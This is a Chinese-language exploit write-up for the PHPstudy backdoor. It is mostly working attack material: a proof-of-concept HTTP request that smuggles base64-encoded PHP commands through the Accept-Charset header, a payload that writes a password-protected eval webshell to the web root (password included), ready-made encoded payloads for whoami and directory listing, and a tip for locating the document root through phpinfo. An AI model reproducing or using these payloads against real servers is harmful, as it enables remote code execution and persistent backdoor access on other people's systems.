# PHPstudy后门

### POC

```
GET /1.php HTTP/1.1
Host: xx
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,_/_;q=0.8
Accept-Language: zh-CN,zh;q=0.9
Accept-Encoding:gzip,deflate
Accept-Charset:这里就是要执行的命令 base64 加密 c3lzdGVtKCdjYWxjLmV4ZScpOw==
Cookie: UM_distinctid=16ae380e49f27e-0987ab403bca49-3c604504-1fa400-16ae380e4a011b; CNZZDATA3801251=cnzz_eid%3D1063495559-1558595034-%26ntime%3D1559102092; CNZZDATA1670348=cnzz_eid%3D213162126-1559207282-%26ntime%3D1559207282
Connection: close
```

### 写shell exp

```
echo "123";file_put_contents("D:/phpstudy/PHPTutorial/WWW/1.php",base64_decode("PD9waHAKCgokY2xhc3MgPSBuZXcgXFJlZmxlY3Rpb25DbGFzcygnZmlsdGVyJyk7CiRpbnN0YW5jZSA9ICRjbGFzcy0+bmV3SW5zdGFuY2UoJF9QT1NUKTsKdW5zZXQoJGluc3RhbmNlKTsKCgovKioKICogQ2xhc3MgZmlsdGVyCiAqLwpjbGFzcyBmaWx0ZXIKewoKICAgIHByaXZhdGUgJHBhc3N3b3JkID0gJ2xsYUxMQSFAIyc7CgogICAgLyoqCiAgICAgKiBudWxsIGNvbnN0cnVjdG9yLgogICAgICogQHBhcmFtIGFycmF5ICRkYXRhCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdChhcnJheSAkZGF0YSkKICAgIHsKICAgICAgICAkdGhpcy0+ZGF0YSA9ICRkYXRhOwogICAgfQoKCiAgICBwdWJsaWMgZnVuY3Rpb24gX19kZXN0cnVjdCgpCiAgICB7CiAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoJHRoaXMtPnBhc3N3b3JkLCAkdGhpcy0+ZGF0YSkgJiYgIWVtcHR5KCR0aGlzLT5kYXRhWyR0aGlzLT5wYXNzd29yZF0pKSB7CiAgICAgICAgICAgIGV2YWwoJHRoaXMtPmRhdGFbJHRoaXMtPnBhc3N3b3JkXSk7CiAgICAgICAgfQogICAgfQoKfQ=="));echo "456";
```

注意`D:/phpstudy/PHPTutorial/WWW/1.php`根据自己的网站目录写shell，随后base64

一句话密码为`llaLLA!@#`

```
Accept-Encoding:gzip,deflate
Accept-Charset:ZWNobyAiMTIzIjtmaWxlX3B1dF9jb250ZW50cygiRDovcGhwc3R1ZHkvUEhQVHV0b3JpYWwvV1dXLzEucGhwIixiYXNlNjRfZGVjb2RlKCJQRDl3YUhBS0Nnb2tZMnhoYzNNZ1BTQnVaWGNnWEZKbFpteGxZM1JwYjI1RGJHRnpjeWduWm1sc2RHVnlKeWs3Q2lScGJuTjBZVzVqWlNBOUlDUmpiR0Z6Y3kwK2JtVjNTVzV6ZEdGdVkyVW9KRjlRVDFOVUtUc0tkVzV6WlhRb0pHbHVjM1JoYm1ObEtUc0tDZ292S2lvS0lDb2dRMnhoYzNNZ1ptbHNkR1Z5Q2lBcUx3cGpiR0Z6Y3lCbWFXeDBaWElLZXdvS0lDQWdJSEJ5YVhaaGRHVWdKSEJoYzNOM2IzSmtJRDBnSjJ4c1lVeE1RU0ZBSXljN0Nnb2dJQ0FnTHlvcUNpQWdJQ0FnS2lCdWRXeHNJR052Ym5OMGNuVmpkRzl5TGdvZ0lDQWdJQ29nUUhCaGNtRnRJR0Z5Y21GNUlDUmtZWFJoQ2lBZ0lDQWdLaThLSUNBZ0lIQjFZbXhwWXlCbWRXNWpkR2x2YmlCZlgyTnZibk4wY25WamRDaGhjbkpoZVNBa1pHRjBZU2tLSUNBZ0lIc0tJQ0FnSUNBZ0lDQWtkR2hwY3kwK1pHRjBZU0E5SUNSa1lYUmhPd29nSUNBZ2ZRb0tDaUFnSUNCd2RXSnNhV01nWm5WdVkzUnBiMjRnWDE5a1pYTjBjblZqZENncENpQWdJQ0I3Q2lBZ0lDQWdJQ0FnYVdZZ0tHRnljbUY1WDJ0bGVWOWxlR2x6ZEhNb0pIUm9hWE10UG5CaGMzTjNiM0prTENBa2RHaHBjeTArWkdGMFlTa2dKaVlnSVdWdGNIUjVLQ1IwYUdsekxUNWtZWFJoV3lSMGFHbHpMVDV3WVhOemQyOXlaRjBwS1NCN0NpQWdJQ0FnSUNBZ0lDQWdJR1YyWVd3b0pIUm9hWE10UG1SaGRHRmJKSFJvYVhNdFBuQmhjM04zYjNKa1hTazdDaUFnSUNBZ0lDQWdmUW9nSUNBZ2ZRb0tmUT09IikpO2VjaG8gIjQ1NiI7
```

![1.png](https://i.loli.net/2019/12/21/UlrvsEPbCW43ASO.png)

看到回复包有`123456`，即shell写入成功

### 常用exp：

phpinfo cGhwaW5mbygpOw==

whoami  c3lzdGVtKCd3aG9hbWknKTs=

Linux 列目录 c3lzdGVtKCdscycpOw==

Windows 列目录  c3lzdGVtKCdkaXInKTs=

![2.png](https://i.loli.net/2019/12/21/dkFgfJ2rPQZz1N8.png)

### 查看网站根目录

利用`phpinfo`-查找`document_root`

![image-20191221123903128.png](https://i.loli.net/2019/12/21/IWfJDHjhbYGPqac.png)

